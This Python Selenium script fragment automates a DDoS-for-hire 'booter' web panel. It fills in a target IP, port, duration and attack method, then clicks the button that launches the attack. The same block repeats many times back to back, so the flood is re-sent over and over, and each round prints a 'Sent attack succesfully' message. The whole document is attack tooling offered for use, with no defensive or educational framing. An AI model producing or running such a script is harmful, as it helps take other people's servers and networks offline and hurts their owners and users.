ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

